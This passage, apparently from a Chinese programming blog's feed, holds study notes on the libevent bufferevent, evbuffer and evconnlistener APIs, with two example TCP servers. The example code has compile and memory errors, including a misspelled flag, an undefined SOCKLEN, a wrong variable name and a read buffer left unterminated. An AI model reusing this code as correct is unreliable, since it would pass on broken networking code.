class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> bufferevent *<span class="title function_">bufferevent_socket_new</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> event_base *base,</span></span><br><span class="line"><span class="params">    <span class="type">evutil_socket_t</span> fd,</span></span><br><span class="line"><span class="params">    <span class="keyword">enum</span> bufferevent_options options)</span>;<span class="comment">//创建一个bufferevent</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bufferevent_socket_connect</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> sockaddr *address, <span class="type">int</span> addrlen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bufferevent_free</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev)</span>;<span class="comment">//释放一个bufferevent</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bufferevent_enable</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">short</span> events)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bufferevent_disable</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">short</span> events)</span>;<span class="comment">//屏蔽bufferevent对应的触发事件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bufferevent_setwatermark</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">short</span> events,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> lowmark, <span class="type">size_t</span> highmark)</span>;<span class="comment">//设置bufferevent 读写操作水位</span></span><br><span class="line"><span class="keyword">struct</span> evbuffer *<span class="title function_">bufferevent_get_input</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev)</span>;</span><br><span class="line"><span class="keyword">struct</span> evbuffer *<span class="title function_">bufferevent_get_output</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev)</span>;<span class="comment">//获取bufferevent对象的evbuffer结构体</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bufferevent_write</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bufferevent_write_buffer</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> evbuffer *buf)</span>;<span class="comment">//向bufferevent中读取或者写入数据</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">bufferevent_read</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">void</span> *data, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bufferevent_read_buffer</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> evbuffer *buf)</span>;</span><br></pre></td></tr></table></figure><h6 id="4-evBuffer"><a href="#4-evBuffer" class="headerlink" title="4.evBuffer"></a>4.evBuffer</h6><p>evBuffer是一个数据缓冲区,常用于创建一块数据缓冲区用于数据的发送和接收<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> evbuffer *<span class="title function_">evbuffer_new</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">evbuffer_free</span><span class="params">(<span class="keyword">struct</span> evbuffer *buf)</span>;<span class="comment">//创建或者释放一个evbuffer</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">evbuffer_get_length</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> evbuffer *buf)</span>;<span class="comment">//得到evbuffer当前的数据长度</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">evbuffer_add</span><span class="params">(<span class="keyword">struct</span> evbuffer *buf, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> datlen)</span>;<span class="comment">//将数据data加入到buf的末尾</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">evbuffer_add_buffer</span><span class="params">(<span class="keyword">struct</span> evbuffer *dst, <span class="keyword">struct</span> evbuffer *src)</span>;<span class="comment">//将 src 中的所有数据移动到 dst 末尾,成功时返回0,失败时返回-1。</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">evbuffer_remove_buffer</span><span class="params">(<span class="keyword">struct</span> evbuffer *src, </span></span><br><span class="line"><span class="params">                    <span class="keyword">struct</span> evbuffer *dst,</span></span><br><span class="line"><span class="params">                    <span class="type">size_t</span> datlen)</span>;<span class="comment">//函数从 src 中移动 datlen 字节到 dst 末尾,尽量少进行复制。如果字节数小于 datlen,所有字节被移动。函数返回移动的字节数。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h6 id="5-evconnlistener"><a href="#5-evconnlistener" class="headerlink" title="5.evconnlistener"></a>5.evconnlistener</h6><p>evconnlistener是一个连接对象,一般用于接收来自客户端的连接</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> evconnlistener *</span><br><span class="line"><span class="title function_">evconnlistener_new</span><span class="params">(<span class="keyword">struct</span> event_base *base,</span></span><br><span class="line"><span class="params">    evconnlistener_cb cb, <span class="type">void</span> *ptr, <span class="type">unsigned</span> flags, <span class="type">int</span> backlog,</span></span><br><span class="line"><span class="params">    <span class="type">evutil_socket_t</span> fd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> evconnlistener *</span><br><span class="line"><span class="title function_">evconnlistener_new_bind</span><span class="params">(<span class="keyword">struct</span> event_base *base,</span></span><br><span class="line"><span class="params">    evconnlistener_cb cb, <span class="type">void</span> *ptr, <span class="type">unsigned</span> flags, <span class="type">int</span> backlog,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="keyword">struct</span> sockaddr *sa, <span class="type">int</span> socklen)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">evconnlistener_free</span><span class="params">(<span class="keyword">struct</span> evconnlistener *lev)</span>;<span class="comment">//创建或者销毁一个evconnlistener</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*evconnlistener_cb)</span><span class="params">(<span class="keyword">struct</span> evconnlistener *listener,</span></span><br><span class="line"><span class="params">    <span class="type">evutil_socket_t</span> sock, <span class="keyword">struct</span> sockaddr *addr, <span class="type">int</span> len, <span class="type">void</span> *ptr)</span>;<span class="comment">//evconnlistener的回调函数</span></span><br><span class="line"><span class="type">evutil_socket_t</span> <span class="title function_">evconnlistener_get_fd</span><span class="params">(<span class="keyword">struct</span> evconnlistener *lev)</span>;</span><br><span class="line"><span class="keyword">struct</span> event_base *<span class="title function_">evconnlistener_get_base</span><span class="params">(<span class="keyword">struct</span> evconnlistener *lev)</span>;<span class="comment">//获取evconnlistener中获取fd或者event_base。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-基本使用步骤"><a href="#3-基本使用步骤" class="headerlink" title="3.基本使用步骤"></a>3.基本使用步骤</h4><ul><li><p>1.创建监听对象</p></li><li><p>2.创建监听事件</p></li><li><p>3.将监听事件加入监听集合</p></li><li><p>4.开始监听</p></li></ul><h4 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务器</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="comment">//转换ip地址类型</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">convertip_to_str</span><span class="params">(<span class="type">int</span> af, <span class="keyword">struct</span> sockaddr *addr, <span class="type">char</span> *str_addr, <span class="type">unsigned</span> <span class="type">short</span> *port)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">addr_tmp</span> =</span> (<span class="keyword">struct</span> sockaddr_in *) addr;</span><br><span class="line">    <span class="keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, SOCKLEN) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *port = ntohs(addr_tmp-&gt;sin_port);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转换ip地址类型</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">convertip_to_net</span><span class="params">(<span class="type">int</span> af, <span class="keyword">struct</span> sockaddr *addr, <span class="type">char</span> *str_addr, <span class="type">unsigned</span> <span class="type">short</span> port)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">addr_tmp</span> =</span> (<span class="keyword">struct</span> sockaddr_in *) addr;</span><br><span class="line">    addr_tmp-&gt;sin_port = htons(port);</span><br><span class="line">    <span class="keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;convert ip failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//帮助信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Usage</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s SERVERADDR SERVERPORT\n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新的socket</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">NewSocket</span><span class="params">(<span class="type">char</span> *addr, <span class="type">char</span> *port, <span class="type">int</span> backlog)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">ADDR</span>;</span></span><br><span class="line">    convertip_to_net(AF_INET, &amp;ADDR, addr, atoi(port));</span><br><span class="line">    <span class="type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bind(fd, (<span class="keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (listen(fd, backlog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理客户端请求</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handler_cb</span><span class="params">(<span class="type">int</span> fd, <span class="type">short</span> event, <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">client</span>;</span></span><br><span class="line">    <span class="type">int</span> client_fd = accept(fd, (<span class="keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);</span><br><span class="line">    <span class="type">char</span> client_addr[<span class="number">15</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> client_port;</span><br><span class="line">    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">Usage(argv[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = NewSocket(argv[<span class="number">1</span>], argv[<span class="number">2</span>], <span class="number">10</span>);</span><br><span class="line">    <span class="comment">//创建一个监听集合</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> =</span> event_base_new();</span><br><span class="line">    <span class="comment">//创建一个事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">new_event</span> =</span> event_new(base, fd, EV_READ | EV_PERSIST, handler_cb, <span class="literal">NULL</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>=</span> &#123;<span class="number">450</span>,<span class="number">30</span>&#125;;<span class="comment">//设置超时时间</span></span><br><span class="line">    <span class="comment">//注册事件</span></span><br><span class="line">event_add(new_event, &amp;timeout);</span><br><span class="line">    <span class="comment">//等待事件的发生</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-连接监听器和数据缓冲区-evconnlistener-bufferevent"><a href="#3-连接监听器和数据缓冲区-evconnlistener-bufferevent" class="headerlink" title="3.连接监听器和数据缓冲区(evconnlistener,bufferevent)"></a>3.连接监听器和数据缓冲区(evconnlistener,bufferevent)</h3><h4 id="1-基本的使用步骤"><a href="#1-基本的使用步骤" class="headerlink" title="1.基本的使用步骤"></a>1.基本的使用步骤</h4><ul><li>1.创建一个事件监听器</li><li>2.设置事件触发的回调函数</li><li>3.开始监听事件</li></ul><h4 id="2-基本的API"><a href="#2-基本的API" class="headerlink" title="2.基本的API"></a>2.基本的API</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//连接监听器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个新的socket并且绑定监听,返回一个struct evconnlistener类型</span></span><br><span class="line"><span class="keyword">struct</span> evconnlistener *</span><br><span class="line"><span class="title function_">evconnlistener_new_bind</span><span class="params">(<span class="keyword">struct</span> event_base *base, evconnlistener_cb cb,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *ptr, <span class="type">unsigned</span> flags, <span class="type">int</span> backlog, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *sa,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> socklen)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将创建好的socket开始监听</span></span><br><span class="line">evconnlistener_new(<span class="keyword">struct</span> event_base *base,</span><br><span class="line">    evconnlistener_cb cb, <span class="type">void</span> *ptr, <span class="type">unsigned</span> flags, <span class="type">int</span> backlog,</span><br><span class="line">    <span class="type">evutil_socket_t</span> fd);</span><br><span class="line"></span><br><span class="line">evconnlistener_disable(<span class="keyword">struct</span> evconnlistener *lev);</span><br><span class="line">evconnlistener_enable(<span class="keyword">struct</span> evconnlistener *lev);</span><br><span class="line"><span class="comment">//重新设置回调函数</span></span><br><span class="line">evconnlistener_set_cb(<span class="keyword">struct</span> evconnlistener *lev,</span><br><span class="line">    evconnlistener_cb cb, <span class="type">void</span> *arg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建缓冲区</span></span><br><span class="line"><span class="keyword">struct</span> bufferevent *<span class="title function_">bufferevent_socket_new</span><span class="params">(<span class="keyword">struct</span> event_base *base,<span class="type">int</span> fd,<span class="type">int</span> option)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置回调函数</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title function_">bufferevent_setcb</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev,</span></span><br><span class="line"><span class="params">    bufferevent_data_cb readcb, bufferevent_data_cb writecb,</span></span><br><span class="line"><span class="params">    bufferevent_event_cb eventcb, <span class="type">void</span> *cbarg)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> bufferevent *<span class="title function_">bufferevent_connect</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="keyword">struct</span> sockaddr *sa, <span class="type">int</span> socklen)</span>;</span><br><span class="line"><span class="comment">//从libevent自行维护的缓冲区中读取数据</span></span><br><span class="line"><span class="type">size_t</span></span><br><span class="line"><span class="title function_">bufferevent_read</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">void</span> *data, <span class="type">size_t</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向libevent自行维护的缓冲区中写入数据</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">bufferevent_write</span><span class="params">(<span class="keyword">struct</span> bufferevent *bufev, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> size)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="comment">//读回调函数</span></span><br><span class="line">bufferevent_data_cb <span class="title function_">read_cb</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev, <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    bufferevent_read(bev, buffer, <span class="number">10</span>);<span class="comment">//从接收缓冲区读取数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read buffer :%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写回调函数</span></span><br><span class="line">bufferevent_data_cb <span class="title function_">write_cb</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev, <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">    bufferevent_write(bev, str, <span class="built_in">strlen</span>(str) + <span class="number">1</span>);<span class="comment">//向客户端发送消息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//异常处理函数</span></span><br><span class="line">bufferevent_event_cb <span class="title function_">error_cb</span><span class="params">(<span class="keyword">struct</span> bufferevent *bev, <span class="type">short</span> event, <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evconnlistener_cb</span><br><span class="line"><span class="title function_">listen_cb</span><span class="params">(<span class="keyword">struct</span> evconnlistener *listener, <span class="type">evutil_socket_t</span> fd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">int</span> socklen,</span></span><br><span class="line"><span class="params">          <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="comment">//这个回调函数传进来的fd为与客户端的通信的fd不是监听的fd</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> =</span> (<span class="keyword">struct</span> event_base *) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">buffevent</span> =</span> bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);<span class="comment">//创建缓冲区</span></span><br><span class="line">    bufferevent_setcb(buffevent, read_cb, write_cb, error_cb, <span class="literal">NULL</span>);<span class="comment">//设置回调函数</span></span><br><span class="line">    bufferevent_enable(bufferevent,EV_READ|EV_PRESIST|EV_WRITE);<span class="comment">//注册事件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">socklen_t</span> SOCKLEN = (<span class="type">socklen_t</span>) (<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> =</span> event_base_new();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">bind_addr</span>;</span></span><br><span class="line">    convertip_to_net(AF_INET, &amp;bind_addr, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span> =</span> evconnlistener_new_bind(base, listen_cb, (<span class="type">void</span> *) base,</span><br><span class="line">LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE_PORT, <span class="number">-1</span>,</span><br><span class="line">&amp;bind_addr, SOCKLEN);</span><br><span class="line">    event_base_dispatch(base);<span class="comment">//循环监听事件</span></span><br><span class="line">    evconnlistener_free(listener);<span class="comment">//释放连接监听器</span></span><br><span class="line">    event_base_free(base);<span class="comment">//释放监听集合;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4.小结"></a>4.小结</h3><p>reactor是一个事件驱动模型,常用于解决需要同时监听多个文件描述符的场景,通常使用一个对象去监听多个文件描述符,而不是简单的轮询实现多个文件描述符的监听,大大的提高的程序的效率,而libevent是一个具体的reactor的解决方案,提供了一系列的接口用于实现reactor模型。因此在实际的开发中,可以直接刁洪libevent库,而不用自己去实现一个reactor模型。</p><p>参考<a href="https://aceld.gitbooks.io/libevent/content/chapter1.html">https://aceld.gitbooks.io/libevent/content/chapter1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libev学习笔记</title>
      <link href="/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
